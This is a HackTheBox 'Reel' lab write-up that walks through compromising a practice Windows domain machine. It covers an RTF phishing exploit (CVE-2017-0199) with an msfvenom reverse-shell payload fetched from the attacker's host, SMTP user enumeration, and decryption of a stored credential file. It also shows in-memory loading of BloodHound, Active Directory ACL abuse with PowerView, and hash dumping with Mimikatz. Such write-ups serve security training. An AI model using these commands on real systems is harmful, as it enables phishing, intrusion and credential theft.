# HackTheBox-Reel

## NMAP

```bash

PORT   STATE SERVICE VERSION                                                                                                                  
21/tcp open  ftp     Microsoft ftpd                          
| ftp-anon: Anonymous FTP login allowed (FTP code 230)                        
|_05-28-18  11:19PM       <DIR>          documents     
| ftp-syst:          
|_  SYST: Windows_NT                                                
22/tcp open  ssh     OpenSSH 7.6 (protocol 2.0)
| ssh-hostkey:            
|   2048 82:20:c3:bd:16:cb:a2:9c:88:87:1d:6c:15:59:ed:ed (RSA)
|   256 23:2b:b8:0a:8c:1c:f4:4d:8d:7e:5e:64:58:80:33:45 (ECDSA)
|_  256 ac:8b:de:25:1d:b7:d8:38:38:9b:9c:16:bf:f6:3f:ed (ED25519)
25/tcp open  smtp?
| fingerprint-strings:                                         
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLS
SessionReq, X11Probe:                                      
|     220 Mail Service ready                                                       
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest: 
|     220 Mail Service ready                               
|     sequence of commands                               
|     sequence of commands                                 
|   Hello:                                 
|     220 Mail Service ready                                                 
|     EHLO Invalid domain address.
|   Help:                                
|     220 Mail Service ready
|     DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY\
|   SIPOptions:                                
|     220 Mail Service ready                                 
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
```

## PORT 21 (FTP)

FTP has anonymous login enabled so we can easily login

<img src="https://i.imgur.com/8lfo3A9.png"/>

We see a folder named `documents`

<img src="https://i.imgur.com/Hmxbgz1.png"/>

And in the folder we can see three files

<img src="https://i.imgur.com/07Sug0q.png"/>

<img src="https://i.imgur.com/gyYqyet.png"/>

Opening the `Applocker.docx` file it tell about making rules for some scripts

<img src="https://i.imgur.com/bTwc6Gr.png"/>

Opening `Windows Event Forwarding.docx` will warn us having a macro in it and will fail to recover document

<img src="https://i.imgur.com/zeKF5fV.png"/>

Lastly the text file has this conent in it

```
Please email me any rtf format procedures - I'll review and convert.
new format / converted documents will be saved here.
```

So from this file it pretty much tells that we need to make a phishing rtf document and send it through mail but the question is send to whom ? We don't have any smb or ldap service which we can try to enumerate users from only smtp service is from where which can enumerate users but we do need a user first so running `exiftool` on word documents we get a username

<img src="https://i.imgur.com/GhhH4B8.png"/>


## PORT 25 (SMTP)

To check if it's a correct email addres we can use `VRFY` to check but that command is not allowed in this smtp server

<img src="https://i.imgur.com/rUa9oIS.png"/>

Instead we can use `RCPT` to check if the email address is valid

<img src="https://i.imgur.com/cjsrwmJ.png"/>

And `nico@megabank.com` is a valid address on which we can send an email , now to send a rtf file windows had a CVE related to rtf which can allow remote commands to be executed which was given a CVE `CVE-2017-0199`


http://rewtin.blogspot.com/2017/04/cve-2017-0199-practical-exploitation-poc.html


## Foothold

Using an exploit from github we can craft a rtf in which we are going to include a url that will fetch hta file and it will execute on the system to give us a reverse shell for that we need to genrate a hta file using `msfvenom`

```bash
sfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=2222 -f hta-psh 
> abc.hta
```

```bash
python cve-2017-0199_toolkit.py -M gen -t RTF -w Invoice.rtf -u http://10.1
0.14.17/abc.hta
```

<img src="https://i.imgur.com/LKuZ1Bi.png"/>

Now to send the mail with the attachment , I was having difficulty to figure out to send it , on goolge every mentioned doing it through telnet by specifiying content-type and other headers but I found a neat tool called `sawks`

http://www.jetmore.org/john/code/swaks/

So running this to send an email to `nico` and starting the python server to hosts the hta file

<img src="https://i.imgur.com/EskSS7h.png"/>

<img src="https://i.imgur.com/TnR0IJ7.png"/>


```bash
swaks --server 10.10.10.77 -f arz@htb.reel -t nico@megbank.com --attach Invoice.rtf
```

<img src="https://i.imgur.com/ZfUBP2n.png"/>

In `nico`'s directory in `Desktop` folder we can see a `cred.xml` file, reading that file it seems that there's an encrpyted password for `Tom` 

<img src="https://i.imgur.com/WS6w7eR.png"/>

## Privilege Escalation (Tom)

Now here I ran into an issue to decrpyt this we need powershell and when I ran powershell the reverse shell would just hang

<img src="https://i.imgur.com/DEyOAMi.png"/>

So we can just pass arguemnts to powershell and decrypt the password for user `Tom`

```powershell
powershell.exe -c "$file = Import-Clixml -Path cred.xml;$file.GetNetworkCredential().Password"
```

<img src="https://i.imgur.com/Fi7QfFr.png"/>

Now that we have credentials for tom user we can use ssh to login

<img src="https://i.imgur.com/zj1hrz0.png"/>

Checking which groups this user is in 

<img src="https://i.imgur.com/RCSfCDZ.png"/>

In the Desktop directory we see a folder `AD Audit` which already has bloodhound folder in it

<img src="https://i.imgur.com/Cu7vKVv.png"/>

<img src="https://i.imgur.com/ds5Y1Oh.png"/>

And from the text file it seems that no path is there to domain admin 

<img src="https://i.imgur.com/8Vzygoj.png"/>

We can import and run `PowerView` commands but I am just more comfortable with using bloodhound but we can't actually import sharphound script from the machine 

<img src="https://i.imgur.com/FHV5ZQw.png"/>

## Privilege Escalation (Claire)

So we can bypass this by loading the script in the memory through `IEX` which downloads the script and loads it into the memory

<img src="https://i.imgur.com/lxa9tC3.png"/>

```powershell
`Invoke-Bloodhound -CollectionMethod All -Domain HTB.LOCAL -ZipFileName loot.zip`
```

<img src="https://i.imgur.com/IVWXQmV.png"/>

To transfer this we can use impacket's smbserver to copy the zip file onto our machine

<img src="https://i.imgur.com/bbFqQ3R.png"/>

<img src="https://i.imgur.com/wBVQaFM.png"/>

After this is transferred we can use bloodhound GUI to see what we can abuse in AD

<img src="https://i.imgur.com/BrSZfVH.png"/>

We have `WriteOwner` access on claire object so we can own this object and give `All` rights on this object in order to reset password
 
```powershell
Set-DomainObjectOwner -Identity claire -OwnerIdentity tom -Verbose
```

<img src="https://i.imgur.com/df0DPbu.png"/>

```powershell
Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights All -Verbose
```

<img src="https://i.imgur.com/bcQklfv.png"/>

<img src="https://i.imgur.com/NYjWuiL.png"/>

<img src="https://i.imgur.com/OCpunVC.png"/>

## Privilege Escalation (Administrator)

Now through `Claire` we can see that we have `WriteDacl` on `BACKUP_ADMINS`

<img src="https://i.imgur.com/4ed5oV7.png"/>

<img src="https://i.imgur.com/xKh1pcO.png"/>

We can see the absue that we can add users to this group

<img src="https://i.imgur.com/xTlcxEb.png"/>

So logging in back with tom we see that we are a member of this group now

<img src="https://i.imgur.com/vKadNmw.png"/>

But it gets reverted quickly so we need to be quick in navigating to `Administrators` folder and there we will find some backup scripts out which `BackupScript.ps1` has a password for administrator account

<img src="https://i.imgur.com/eo0KGJE.png"/>

<img src="https://i.imgur.com/ZX7VbeZ.png"/>

Having the password we can login through ssh 

<img src="https://i.imgur.com/D8N2dSV.png"/>

Further loading `Mimikatz` we can dump SAM hashes

<img src="https://i.imgur.com/kIyKDID.png"/>

<img src="https://i.imgur.com/AZCJOea.png"/>

## References

- https://pentestmonkey.net/tools/user-enumeration/smtp-user-enum
- https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication
- https://github.com/bhdresh/CVE-2017-0199
- https://linux.die.net/man/1/swaks
- http://www.jetmore.org/john/code/swaks/
- https://mcpmag.com/articles/2017/07/20/save-and-read-sensitive-data-with-powershell.aspx
- https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
